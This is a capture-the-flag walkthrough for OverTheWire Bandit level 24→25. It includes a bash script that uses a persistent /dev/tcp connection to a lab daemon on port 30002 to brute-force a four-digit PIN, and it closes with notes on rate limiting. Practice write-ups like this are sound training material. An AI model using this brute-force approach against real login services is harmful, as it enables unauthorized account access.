# Bandit Level 24 → Level 25

---

## 🎯 Objective

A daemon is listening on port **30002** and will give you the password for **bandit25** if provided with:

- The **correct password for bandit24**, followed by

- A **secret 4-digit numeric PIN code**

You **do not need to open a new connection** for every attempt. The goal is to brute-force the PIN in a single persistent connection using a custom script.


---


## 🛠️ Commands Used (with explanations)

`exec` - Opens, redirects, or closes file descriptors in the shell

`/dev/tcp/host/port` - Bash feature that allows TCP connections via a pseudo-device file

`3<>` - Opens file descriptor 3 for both reading and writing

`read` - Reads a line of input from standard input or a file descriptor

`-r` - Prevents backslashes from being interpreted as escape characters in input

`while` - Starts a loop that continues as long as the condition is true

`<` - Redirects input from a file or file descriptor

`<&3` - Reads input from file descriptor 3 (our TCP connection)

`echo` - Prints text to standard output or a file descriptor

`>&3` - Sends output to file descriptor 3 (our TCP connection)

`&` - Runs the preceding command in the background

`chmod` - Changes file permissions

+x - Adds executable permission to a file

  
---

## 🚀 Steps to Solve
1. **Open your terminal**

2. **Run the following command to log into the server**:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

3. **Enter the password**

4. **Create a temporary directory to work in**:
```bash
mktemp -d
```
  - You should see:
```bash
/tmp/tmp.<tmp_directory>
```

5. **Move into your temporary directory**:
```bash
cd /tmp/tmp.<temp_directory>
```
    
6. **Create your brute-force script**:
```bash
touch script.sh
```
    
7. **Open, edit, and save the script:**:
```bash
nano script.sh
```
  - Add:
    ```bash
    #!/bin/bash

    exec 3<>/dev/tcp/localhost/30002

    while read -r line <&3; do
    echo "Received: $line"
    done &

    for i in {0..9999}; do
    echo "<bandit24_password> $i" >&3
    done

    exec 3>&-
    ```


8. **Make the script executable**:
```bash
chmod +x script.sh
```

9. **Run the script**:
```bash
./script.sh
```

10. **Wait and observe output**:
```bash
Received: Wrong! Please enter the correct current password and pincode. Try again.
Received: Wrong! Please enter the correct current password and pincode. Try again.
Received: Wrong! Please enter the correct current password and pincode. Try again.
Received: Wrong! Please enter the correct current password and pincode. Try again.
Received: Wrong! Please enter the correct current password and pincode. Try again.
```
  - Eventually, you should see:
    ```bash
    Received: The password of user bandit25 is <bandit25_password>
    ```
    

Thats the password for `bandit25`

---

## 🎉 You’ve now completed Level 24 → Level 25!


---

## 🧠 Lessons Learned / Notes
- **Brute-forcing efficiently**: Instead of repeatedly connecting, we keep a single TCP connection open, which is far more efficient and realistic in some real-world attacks.

- **Socket handling in Bash**: Bash's `/dev/tcp/` makes it possible to use network sockets without external tools like `nc` or `telnet`.

- **Persistent file descriptors**: Advanced Bash scripting using exec and custom file descriptors is very powerful.

- **Security takeaway**: Services that do not throttle or limit authentication attempts are vulnerable to brute-force attacks.
